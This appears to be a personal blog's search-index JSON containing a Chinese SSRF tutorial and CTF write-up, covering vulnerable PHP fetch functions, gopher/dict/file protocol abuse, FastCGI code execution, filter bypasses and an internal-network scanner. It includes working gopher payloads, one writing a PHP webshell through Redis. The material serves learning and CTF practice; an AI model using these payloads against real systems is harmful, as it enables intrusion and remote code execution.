{"meta":{"title":"Ethe's blog","subtitle":"Etheの博客","description":"","author":"Ethe","url":"https://Ethe448.github.io","root":"/"},"pages":[{"title":"404","date":"2022-01-17T03:58:22.000Z","updated":"2022-01-17T03:58:42.774Z","comments":true,"path":"404/index.html","permalink":"https://ethe448.github.io/404/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:57:26.689Z","comments":true,"path":"categories/index.html","permalink":"https://ethe448.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:25.024Z","comments":true,"path":"about/index.html","permalink":"https://ethe448.github.io/about/index.html","excerpt":"","text":""},{"title":"contact","date":"2022-01-16T13:54:11.000Z","updated":"2022-01-17T07:10:36.704Z","comments":true,"path":"contact/index.html","permalink":"https://ethe448.github.io/contact/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:57.523Z","comments":true,"path":"tags/index.html","permalink":"https://ethe448.github.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-01-16T13:54:20.000Z","updated":"2022-01-16T13:55:40.821Z","comments":true,"path":"friends/index.html","permalink":"https://ethe448.github.io/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"ssrf","slug":"ssrf","date":"2022-04-26T07:07:27.000Z","updated":"2022-04-29T15:29:10.040Z","comments":true,"path":"2022/04/26/ssrf/","link":"","permalink":"https://ethe448.github.io/2022/04/26/ssrf/","excerpt":"","text":"SSRF首先，什么是ssrf？ SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者向服务端发送包含恶意 URL 链接的请求，借由服务端去访问此 URL ，以获取受保护网络内的资源的一种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。 SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。 请求地址被恶意利用的话，如下图所示，就能够以服务端的身份向任意地址发起请求，如果是一台存在远程代码执行漏洞的内网机器，借助 SSRF 漏洞就可以获取该内网机器的控制权。 ssrf的危害内网探测：对内网服务器、办公机进行端口扫描、资产扫描、漏洞扫描。 窃取本地和内网敏感数据：访问和下载内网的敏感数据，利用 File 协议访问服务器本地文件。 攻击服务器本地或内网应用：利用发现的漏洞进一步发起攻击利用。 跳板攻击：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以隐藏自己真实 IP。 绕过安全防御：比如防火墙、CDN（内容分发网络，比如加速乐、百度云加速、安全宝等等）防御。 拒绝服务攻击：请求超大文件，保持链接 Keep-Alive Always。 在服务器上搭个环境，看到页面查到的ip是服务器的，而不是本机的ip 相关危险函数SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。 file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。 &lt;?php $url &#x3D; $_GET[&#39;url&#39;];; echo file_get_contents($url); ?&gt; readfile()：输出一个文件的内容。 fsockopen()：打开一个网络连接或者一个Unix 套接字连接。 &lt;?php function GetFile($host,$port,$link) &#123; $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\\r\\n&quot;; $out .&#x3D; &quot;Host: $host\\r\\n&quot;; $out .&#x3D; &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .&#x3D; &quot;\\r\\n&quot;; fwrite($fp, $out); $contents&#x3D;&#39;&#39;; while (!feof($fp)) &#123; $contents.&#x3D; fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125; ?&gt; curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。 &lt;?php if (isset($_POST[&#39;url&#39;]))&#123; $link &#x3D; $_POST[&#39;url&#39;]; $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项 $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器 curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源 fopen()：打开一个文件文件或者 URL。 …… 一些tips 1.一般情况下PHP不会开启fopen的gopher wrapper 2.file_get_contents的gopher协议不能URL编码 3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转， 6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议 相关协议 file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容 dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等 gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell http/s协议：探测内网主机存活 贴一下国光师傅的博客 https://www.sqlsec.com/2021/05/ssrf.html file协议file协议主要用于访问本地计算机中的文件，命令格式为： file:&#x2F;&#x2F;文件路径 利用场景使用file协议进行的任意文件读取算是ssrf最简单的利用方式了首先先写一段有ssrf漏洞的代码，命名为ssrf.php并部署到服务器上。 &lt;?php highlight_file(&#39;shell.php&#39;); $url &#x3D; $_GET[&#39;url&#39;]; echo($url); $curlobj &#x3D; curl_init($url); echo curl_exec($curlobj); ?&gt; 然后就可以利用file协议进行读取文件操作了 另外，如果是宝塔建的站，记得复现的时候把这个防跨站攻击关了，不然什么也读不到 file协议与http协议的区别 file协议主要用于读取服务器本地文件，访问的是本地的静态资源 http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析 http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以 file对应的类似http的协议是ftp协议（文件传输协议） file不能跨域 Gopher协议协议简介gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。gopher 协议使用tcp 可靠连接。 gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题了。 协议格式URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流 gopher的默认端口是70 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码 &lt;gopher-path&gt;其中&lt;gopher-path&gt;格式可以是如下其中的一种&lt;/gopher-path&gt;,当然，这部分也可以省略 &lt;gophertype&gt;&lt;selector&gt; &lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt; &lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt; 整个&lt;gopher-path&gt;部分可以省略，这时候\\也可以省略&lt;gophertype&gt;为默认的1。&lt;gophertype&gt;是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。&lt;selector&gt;个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii 编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex 编码的原始数据后再每两个字符的加上%，通过对比发现直接url 编码的话会少了%0d回车字符。&lt;search&gt;用于向gopher 搜索引擎提交搜索数据，和&lt;selector&gt;之间用%09隔开。&lt;gopher+_string&gt;是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。 先试一下 vps上监听5001端口，然后在另一台上利用gopher发送请求 发现虽然发送的请求是abcd但是接收的只有bcd 这是因为用一个单字符表示了&lt;gophertype&gt;部分 构造get请求网页代码为 &lt;?php echo &quot;Hello &quot;.$_REQUEST[&quot;name&quot;].&quot;\\n&quot; ?&gt; get的请求方式就是 curl gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A 构造post请求curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A 与get不同的地方就是要加上Content-Type和Content-Length Gopher与get shell首先准备一个有ssrf漏洞的代码 先试一下 那我们能不能用这个代码来读到我们test.php里的内容呢 curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher:&#x2F;&#x2F;ip:80&#x2F;_GET%20&#x2F;ssrf&#x2F;test&#x2F;test.php%3fname&#x3D;Margin%20HTTP&#x2F;1.1%0d%0AHost:%20ip%0d%0A 构造这样的payload，但是发现并没有回显出test.php里的内容 这里是因为在PHP在接收到参数后会做一次URL的解码，%20等字符已经被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要进行二次URL编码。 curl http:&#x2F;&#x2F;ip&#x2F;ssrf&#x2F;test&#x2F;shell.php?url&#x3D;gopher%3A%2F%2Fip%3A80%2F_GET%2520%2Fssrf%2Ftest%2Ftest.php%253fname%3DMargin%2520HTTP%2F1.1%250d%250AHost%3A%2520ip%250d%250A 成功利用 剩下的部分搭环境比较麻烦，而且还有的涉及到Java的框架了，不想搭了（瘫，直接贴链接了 https://xz.aliyun.com/t/6993 Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com) DICT协议定义词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。 使用 dictd 搭建 DICT 字典服务器 | wzyboy’s blog 利用dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F; 用nc在测试机监听，然后利用ssrf漏洞测试一下dict协议发送字符串info，看看接收方会收到什么： 可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的QUIT。 成功看到了mysql数据库的版本号 可以利用dict进行指纹识别 FastCGI这部分不是很熟，直接上参考文章了 https://www.modb.pro/db/163739 什么是FastCGI在网站架构中，Web Server（如Nginx）只是内容的分发者 当客户端请求的是index.php，根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理 当Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器 接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以CGI规范的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程 CGI： 是 Web Server 与 Web Application 之间 数据交换的一种协议 FastCGI： 同 CGI，是一种通信协议，对比 CGI 提升了5倍以上性能 PHP-CGI： 是 PHP（Web Application）对 Web Server 提供的 CGI 协议的接口程序 PHP-FPM： 是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能的任务管理功能 PHP默认提供了很多种SAPI（服务器端应用编程端口），常见的提供给apache和nginx的php5_module、CGI、FastCGI，给IIS的ISAPI，以及Shell的CLI 经过不断的技术升级，目前搭建高性能的PHP Web服务器，最佳的方式是Apache/Nginx + FastCGI + **PHP-FPM(PHP-CGI)**方式 工作原理 Web 服务器启动时载入FastCGI进程管理器（PHP-CGI或者PHP-FPM) FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程，并等待来自 Web Server 的连接 Web 服务器与 FastCGI 进程管理器进行 Socket 通信，选择一个CGI 解释器进程，通过 FastCGI 协议发送 CGI 环境变量和标准输入数据给 这个CGI 解释器进程 CGI 解释器进程完成处理后将标准输出和错误信息从同一连接返回 Web 服务器 CGI 解释器进程接着等待并处理来自 Web 服务器的下一个连接 由此，PHP-FPM 就是一个FastCGI进程管理器，是对于 FastCGI 协议的具体实现，它负责管理一个进程池，来处理来自Web服务器的请求。 PHP-FPM通信方式在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种，TCP模式和套接字(unix socket)模式 TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端请求数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析 Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。上述原理图中提到的Socket 通信即为此模式 ssrf中对FastCGI的攻击也是利用了TCP模式 FastCGI攻击FastCGI协议HTTP协议是浏览器和服务器中间件进行数据交换的协议，类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端（如PHP-FPM）进行数据交换的协议 Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件 record的头固定8个字节，body是由头中的contentLength指定，其结构如下： typedef struct &#123; &#x2F;* Header *&#x2F; unsigned char version; &#x2F;&#x2F; 版本 unsigned char type; &#x2F;&#x2F; 本次record的类型 unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id unsigned char requestIdB0; unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; &#x2F;&#x2F; 额外块大小 unsigned char reserved; &#x2F;* Body *&#x2F; unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; &#125; FCGI_Record; 语言端（PHP-FPM）解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体 Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用 &gt;不需要该Padding的时候，将其长度设置&gt;为0即可 可见，一个fastcgi record结构最大支持的body大小是2^16 ，也就是65536字节 其中，header中的type代表本次record的类型，所有值及具体含义如下 服务器中间件和后端语言通信，第一个数据包就是type为1的record，后续互相交流，发送type为4、5、6、7的record，结束时发送type为2、3的record。 这里着重讲一下type为4，当后端语言接收到一个 type 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，结构如下： typedef struct &#123; unsigned char nameLengthB0; &#x2F;* nameLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char nameData[nameLength]; unsigned char valueData[valueLength]; &#125; FCGI_NameValuePair11; typedef struct &#123; unsigned char nameLengthB0; &#x2F;* nameLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; &#125; FCGI_NameValuePair14; typedef struct &#123; unsigned char nameLengthB3; &#x2F;* nameLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength]; &#125; FCGI_NameValuePair41; typedef struct &#123; unsigned char nameLengthB3; &#x2F;* nameLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char nameLengthB2; unsigned char nameLengthB1; unsigned char nameLengthB0; unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F; unsigned char valueLengthB2; unsigned char valueLengthB1; unsigned char valueLengthB0; unsigned char nameData[nameLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; unsigned char valueData[valueLength ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0]; &#125; FCGI_NameValuePair44; 这其实是 4 个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用 FCGI_NameValuePair11 key大于128字节，value小于128字节，用 FCGI_NameValuePair41 key小于128字节，value大于128字节，用 FCGI_NameValuePair14 key、value均大于128字节，用 FCGI_NameValuePair44 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2如果web目录是/var/www/html那么服务器中间件（Nginx）会将这个请求变成如下key-value对： &#123; &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39; &#125; 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉FPM：“我要执行哪个PHP文件” 当后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php 漏洞原理PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造FastCGI协议，和FPM进行通信。 所以我们如果能够自行构造SCRIPT_FILENAME的值，就能控制PHP-FPM执行任意后缀文件，如/etc/passwd 但是，在PHP5.3.9之后，FPM默认配置中增加了security.limit_extensions选项 ; Limits the extensions of the main script FPM will allow to parse. This can ; prevent configuration mistakes on the web server side. You should only limit ; FPM to .php extensions to prevent malicious users to use other extensions to ; exectute php code. ; Note: set an empty value to allow all extensions. ; Default Value: .php ;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7 限制了只有.php后缀的文件才能够被FPM执行 因此，想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。已存在的PHP文件名获得有两种方法： 通过系统的信息收集、爆破、报错获得某个PHP文件名及其路径 找安装PHP后默认存在的PHP文件，如/usr/local/lib/php/PEAR.php 现在，拿到了文件名，我们能控制SCRIPT_FILENAME，却只能执行目标服务器上的文件，并不能执行我们想要执行的任意代码，但我们可以通过构造type值为4的record，也就是设置向PHP-FPM传递的环境变量来达到任意代码执行的目的 在PHP.INI中有两个配置项，auto_prepend_file和auto_append_file。 auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件； auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。 若我们设置auto_prepend_file为php://input（allow_url_include=on），那么就等于在执行任何PHP文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在FastCGI协议 Body中，它们就能被执行了 而这就要利用后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到的环境变量了。 在其中有PHP_VALUE和PHP_ADMIN_VALUE两个特殊的值 所以我们只要将环境变量构造成 &#123; &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;, &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;, &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;, &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;, &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;, &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;REMOTE_PORT&#39;: &#39;12345&#39;, &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;, &#39;SERVER_PORT&#39;: &#39;80&#39;, &#39;SERVER_NAME&#39;: &quot;localhost&quot;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39; &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;, &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39; &#125; 就能实现rce的目的 ctf中一般的利用条件 PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件 知道题目环境中的一个PHP文件的绝对路径 PHP-FPM监听在本机9000端口 一些绕过对于SSRF的限制大致有如下几种： 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。 限制域名只能为http://www.xxx.com 限制不能访问内网的IP，以防止对内网进行攻击。 屏蔽返回的详细信息。 利用HTTP基本身份认证的方式绕过如果目标代码限制访问的域名只能为 http://www.xxx.com ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com 本地回环地址的其他表现形式127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])： http://127.0.0.1http://localhosthttp://127.255.255.254127.0.0.1 - 127.255.255.254http://[::1]http://[::ffff:7f00:1]http://[::ffff:127.0.0.1]http://127.1http://127.0.1http://0:80 IP的进制转换IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。使用如win系统自带的计算机（程序员模式）就可简单实现IP地址的进制转换。 由于一些系统会直接提取邮件中内嵌的链接进行检测，而一种此类URL混淆技术采用了URL主机名部分中使用的编码十六进制IP地址格式来逃避检测。 由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用： 点分十进制IP地址：http://127.0.0.1 八进制IP地址：http://0177.0.0.1（将每个十进制数字转换为八进制） 十六进制IP地址：http://0x7F000001或者http://0x7F.0.0.1（将每个十进制数字转换为十六进制） 整数或DWORD IP地址：http://2130706433（将十六进制IP转换为整数） 白嫖个脚本 &lt;?php $ip &#x3D; &#39;127.0.0.1&#39;; $ip &#x3D; explode(&#39;.&#39;,$ip); $r &#x3D; ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ; if($r &lt; 0) &#123; $r +&#x3D; 4294967296; &#125; echo &quot;十进制:&quot;; &#x2F;&#x2F; 2130706433 echo $r; echo &quot;八进制:&quot;; &#x2F;&#x2F; 0177.0.0.1 echo decoct($r); echo &quot;十六进制:&quot;; &#x2F;&#x2F; 0x7f.0.0.1 echo dechex($r); ?&gt; 利用302跳转绕过内网IP网络上存在一个很神奇的服务，网址为 http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子： 当我们访问：http://127.0.0.1.xip.io/flag.php 时，实际上访问的是http://127.0.0.1/1.php 。像这种网址还有http://nip.io，http://sslip.io 。 这个我在自己的服务器上没试成功，不知道为什么 短地址跳转绕过将连接变为短链接 比如这种 宝塔方便是方便。。。但是复现漏洞的时候也太安全了，全给拦了。。。。 利用不存在的协议头绕过指定的协议头file_get_contents()函数的一个特性，即当PHP的 file_get_contents() 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性） 利用URL的解析问题可以用0.0.0.0绕过对内网ip的检测， 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过： 利用readfile和parse_url函数的解析差异绕过指定的端口 参考文章(4条消息) 用SSRF打穿内网_ZredamanJ的博客-CSDN博客 https://www.jianshu.com/p/a5ceccfa279a https://zhuanlan.zhihu.com/p/115222529 https://blog.csdn.net/qq_43665434/article/details/115434528 铭说｜关于SSRF和多种绕过方式 (baidu.com) (4条消息) SSRF利用 Gopher 协议拓展攻击面_BerL1n的博客-CSDN博客_gopherus使用 (4条消息) 浅谈ssrf与ctf那些事_合天网安实验室的博客-CSDN博客_ctfssrf (4条消息) SSRF in PHP_bylfsj的博客-CSDN博客 赵总这个新利用方法先放一下 基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华 – glzjin (zhaoj.in) 已经超过我的基础知识了 小tips： SSRF一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie(存放网络适配器地址)，从而获得目标主机的内网网段并进行爆破，后面两个所需要的权限高一点，可以用file协议读一下 Linux中proc信息获取 - Yangsir34 - 博客园 (cnblogs.com) 例题[GKCTF2020]EZ三剑客-EzWeb输入www.baidu.com会出现的百度的页面 然后加一个源码里提示的secret参数，能找到这台主机的网卡配置信息，得到内网ip 10.244.80.251而且输入框内后 所以我们可以尝试利用ssrf来得到在内网其他机器上的flag 可以用file协议看看源码 过滤了file://，可以使用file:/,file: ///,file:_///绕过 file: &#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php &lt;?php function curl($url)&#123; $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch); &#125; if(isset($_GET[&#39;submit&#39;]))&#123; $url &#x3D; $_GET[&#39;url&#39;]; &#x2F;&#x2F;echo $url.&quot;\\n&quot;; if(preg_match(&#39;&#x2F;file\\:\\&#x2F;\\&#x2F;|dict|\\.\\.\\&#x2F;|127.0.0.1|localhost&#x2F;is&#39;, $url,$match)) &#123; &#x2F;&#x2F;var_dump($match); die(&#39;别这样&#39;); &#125; curl($url); &#125; if(isset($_GET[&#39;secret&#39;]))&#123; system(&#39;ifconfig&#39;); &#125; ?&gt; bp不知道为什么寄了，扫不了这个，只能上python了 import requests a &#x3D; [] url &#x3D; &quot;http:&#x2F;&#x2F;4a20197b-aba4-4baa-ac34-21588a8ab47b.node4.buuoj.cn:81&#x2F;index.php?url&#x3D;10.244.80.&#123;&#125;&amp;submit&#x3D;%E6%8F%90%E4%BA%A4&quot; for i in range(0,255): print(i) url1 &#x3D; url.format(i) print(url1) try: r &#x3D; requests.get(url1,timeout&#x3D;1) print(r.text) a.append(i) continue except Exception as e: print(&#39;timeout&#39;) print(a) 根据提示找找端口，再测一下发现有6379端口 说明开启着redis服务 gopherus生成个payload 改一下ip gopher:&#x2F;&#x2F;10.244.80.69:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 打进去之后访问一下shell.php (这里如果直接把payload接在url的参数需要再进行一次url编码 CTFHUB SSRF内网访问确定存在ssr 题目说了flag在127.0.0.1的flag.php里 伪协议读取文件利用file协议读取文件 用绝对路径 端口扫描 POST要求就是给127.0.0.1的flag.php传个post参数key，key值在源码的注释里 gopher的url解码还挺玄幻的 试了几个小时，好几个网站的编码还有python和php自带的url编码的函数，但是都有点问题，最后就只有这两种成功了 http:&#x2F;&#x2F;challenge-0334eacc0c1b7b0d.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D21c12d709c44fe44f99ee5ba47501882 